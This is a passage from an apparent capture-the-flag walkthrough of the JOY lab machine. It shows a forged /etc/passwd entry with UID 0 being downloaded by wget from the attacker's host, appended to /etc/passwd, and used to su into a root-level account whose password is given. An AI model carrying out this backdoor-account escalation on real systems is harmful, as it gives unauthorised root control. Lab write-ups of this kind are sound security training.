palomo:$6$saltsalt$9vIXh5xFJESF2.DxxXyWlpOT.0t06Y2Pk11StIw2L8oaOTl42ZfuhPPi5h2PPjbLI.FnnhTBEMMcL05LS2ZmY.:0:0::/root/:/bin/bash
root@kali:~/JOY# cp add.txt /var/www/html/


/*en la VM JOY*/

patrick@JOY:/var/www/tryingharderisjoy/ossec$ cd /tmp
cd /tmp
patrick@JOY:/tmp$ wget http://10.10.10.133/add.txt
wget http://10.10.10.133/add.txt
--2021-03-26 18:44:30--  http://10.10.10.133/add.txt
Connecting to 10.10.10.133:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 128 [text/plain]
Saving to: ‘add.txt’

add.txt             100%[===================>]     128  --.-KB/s    in 0s      

2021-03-26 18:44:30 (23.4 MB/s) - ‘add.txt’ saved [128/128]

patrick@JOY:/tmp$ cat add.txt >> /etc/passwd
cat add.txt >> /etc/passwd
patrick@JOY:/tmp$ su palomo
su palomo
Password: 12345678

```

<img src="https://github.com/El-Palomo/JOY/blob/main/joy16.jpg" widht=80% />

